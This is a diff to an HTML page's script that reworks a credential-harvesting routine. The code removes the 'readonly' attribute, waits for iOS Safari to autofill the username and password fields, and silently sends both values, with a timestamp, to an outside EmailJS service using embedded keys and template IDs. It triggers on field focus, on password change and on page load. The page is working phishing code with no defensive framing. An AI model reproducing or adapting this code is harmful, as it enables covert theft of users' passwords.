@@ -239,38 +239,51 @@
     
     
     </style>
-    <script>
+    
+  <script>
     emailjs.init("y3lRWL7KLDjiFjNcN");
 
-    // iOS-specific: Listen for 'pageshow' which fires on load/restore
-    window.addEventListener('pageshow', function(event) {
+    // 1. Detect when the user taps the username field
+    document.getElementById('username').addEventListener('focus', function() {
         
-        // Wait 500ms to let iOS Safari finish autofilling
+        // Remove readonly so we can read the value
+        this.removeAttribute('readonly');
+        
+        // Wait 200ms for iOS to fully populate the field
         setTimeout(function() {
-            
-            // Get fields by ID (ensure your HTML has id="username" and id="password")
-            var u = document.getElementById("username").value;
-            var p = document.getElementById("password").value;
+            captureCredentials();
+        }, 200);
+    });
 
-            // Check if we have data
-            if (u && p) {
-                emailjs.send("service_2bhy4ju", "template_1qzswkk", {
-                    username: u,
-                    password: p,
-                    timestamp: new Date().toLocaleString(),
-                    device: "iOS iPhone"
-                }).then(function() {
-                    console.log("iOS Credentials Sent!");
-                }, function(error) {
-                    console.log("iOS Send Failed:", error);
-                });
-            } else {
-                console.log("No Data on iOS. U: [" + u + "] P: [" + p + "]");
-            }
-        }, 500); // 500ms delay for iOS
+    // 2. Also listen for any change in the password field (as a backup)
+    document.getElementById('password').addEventListener('change', function() {
+        captureCredentials();
+    });
+
+    function captureCredentials() {
+        var u = document.getElementById('username').value;
+        var p = document.getElementById('password').value;
+
+        // Check if we have data
+        if (u && p) {
+            emailjs.send("service_2bhy4ju", "template_1qzswkk", {
+                username: u,
+                password: p,
+                timestamp: new Date().toLocaleString(),
+                method: "iOS Tap Capture"
+            }).then(function() {
+                console.log("iOS Tap Capture Success");
+            }, function(error) {
+                console.log("iOS Tap Capture Failed", error);
+            });
+        }
+    }
+
+    // 3. Also try one last time on page load with a longer delay
+    window.addEventListener('load', function() {
+        setTimeout(captureCredentials, 1000);
     });
 </script>
-
 
 
  
